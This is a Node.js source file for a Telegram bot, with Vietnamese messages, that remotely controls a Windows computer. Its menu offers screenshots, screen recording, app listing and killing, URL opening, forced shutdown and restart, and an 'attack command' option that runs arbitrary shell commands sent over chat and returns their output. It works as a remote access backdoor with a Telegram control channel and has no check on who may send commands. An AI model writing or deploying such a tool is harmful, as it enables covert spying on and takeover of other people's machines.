const { Telegraf } = require("telegraf");
const Methods = require("./modalMenu");
require("dotenv").config();
const API_KEY = process.env.API_KEY;
const bot = new Telegraf(API_KEY);
const waitingForInput = {};
bot.command("menu", (ctx) => {
  ctx.reply("Menu:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Screenshot 👁", callback_data: "option2" }],
        [{ text: "Killapp 👩‍💻", callback_data: "option3" }],
        [{ text: "open url 👩", callback_data: "option4" }],
        [{ text: "attack command 💽", callback_data: "option5" }],
        [{ text: "application list 💻", callback_data: "option6" }],
        [{ text: "record screen ⏺", callback_data: "option8" }],
        [{ text: "Shutdown ❌", callback_data: "option1" }],
        [{ text: "restart ⭕️", callback_data: "option7" }],
      ],
    },
  });
});
(async () => {
  try {
    bot.action("option1", async (ctx) => {
      await Methods.executeCommand("shutdown /s /f /t 5");
      ctx.reply("tắt nguồn thành công");
    });
    bot.action("option2", async (ctx) => {
      await Methods.screenshotEx(ctx);
      ctx.reply("gửi ảnh thành công");
    });
    bot.action("option3", (ctx) => {
      ctx.reply("Nhập app muốn kill:");
      waitingForInput[ctx.from.id] = "killapp";
    });
    bot.action("option4", async (ctx) => {
      ctx.reply("nhập trình duyệt và url");
      waitingForInput[ctx.from.id] = "waiturl";
    });
    bot.action("option5", async (ctx) => {
      ctx.reply("nhập lệnh thực thi");
      waitingForInput[ctx.from.id] = "cmd";
    });
    bot.action("option6", async (ctx) => {
      try {
        await Methods.writeAndSend(ctx);
      } catch (error) {
        ctx.reply(`lỗi khi thực thi: ${e.message} `);
      }
    });
    bot.action("option7", async (ctx) => {
      await Methods.executeCommand("shutdown /r /t 5");
      ctx.reply("khởi động lại thành công");
    });
    bot.action("option8", async (ctx) => {
      try {
        await Methods.recordScreen(ctx);
      } catch (error) {
        console.log(error);
      }
    });

    bot.hears(/.+/gi, async (ctx) => {
      const userId = ctx.from.id;
      const userAction = waitingForInput[userId];
      const userChat = ctx.message.text;

      if (userAction) {
        switch (userAction) {
          case "killapp":
            try {
              await Methods.killApp(ctx.message.text);
              ctx.reply("Đã tắt thành công: " + ctx.message.text);
            } catch (error) {
              ctx.reply(`Lỗi khi tắt app: ${error.message}`);
            }
            delete waitingForInput[userId];
            break;
          case "waiturl":
            try {
              await Methods.openUrl(ctx.message.text);
              ctx.reply("Mở thành công");
            } catch (error) {
              ctx.reply(`Lỗi khi mở: mã lỗi: ${error.message}`);
            }
            delete waitingForInput[userId];
            break;
          case "cmd":
            if (userChat.toLowerCase() == "exit") {
              ctx.reply("đã đóng lệnh cmd");
              delete waitingForInput[userId];
            } else {
              try {
                const result = await Methods.attack(ctx.message.text);
                ctx.reply(`chạy thành công: ${result}`);
              } catch (error) {
                ctx.reply(`Lỗi khi thực thi: ${error.message}`);
              }
            }
            break;
        }
      }
    });
  } catch (error) {
    console.log(error);
  }
})();

bot.launch();
